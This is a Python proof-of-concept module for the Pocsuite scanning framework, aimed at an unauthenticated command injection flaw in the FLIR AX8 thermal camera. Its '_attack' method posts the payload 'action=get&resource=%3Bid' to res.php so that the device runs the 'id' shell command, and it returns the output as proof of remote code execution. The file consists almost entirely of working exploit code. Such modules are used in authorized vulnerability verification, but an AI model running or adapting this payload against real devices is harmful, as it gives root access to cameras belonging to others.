#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import Output, POCBase
from pocsuite.utils import register

class TestPOC(POCBase):
    vulID = ''  # vul ID
    version = '1'
    author = ['']
    vulDate = '2018-10-29'
    createDate = '2018-10-29'
    updateDate = '2018-10-29'
    references = ['https://cn.0day.today/exploit/31332']
    name = 'FLIR Systems FLIR AX8 Thermal Camera Command Injection'
    appPowerLink = 'http://www.flir.cn'
    appName = 'FLIR Systems'
    appVersion = 'FLIR AX8'
    vulType = 'Command Injection'
    desc = '''
         The FLIR AX8 thermal sensor camera suffers from two unauthenticated
         command injection vulnerabilities. The issues can be triggered when calling
         multiple unsanitized HTTP GET/POST parameters within the shell_exec function
         in res.php and palette.php file. This can be exploited to inject arbitrary
         system commands and gain root remote code execution.
    '''

    samples = ['']

    def _attack(self):
        head = {'Connection-Type':'application/x-www-form-urlencoded','Content-Type':'application/x-www-form-urlencoded'}
        payload = 'action=get&resource=%3Bid'
        
        response = req.post(self.url+'/res.php', data = payload,headers = head)     
        if response.content:
            return self.parse_attack(response.content)
        else:
            return self.parse_attack(False)
            
    def _verify(self):
        return self._attack()
        
    def parse_attack(self, content):
        output = Output(self)
        result = {}
        if content:
            result['result']={}
            result['result']['command'] = 'id'
            result['result']['result'] = content
            output.success(result)
        else:
            output.fail('Getshell failed')
        return output

register(TestPOC)
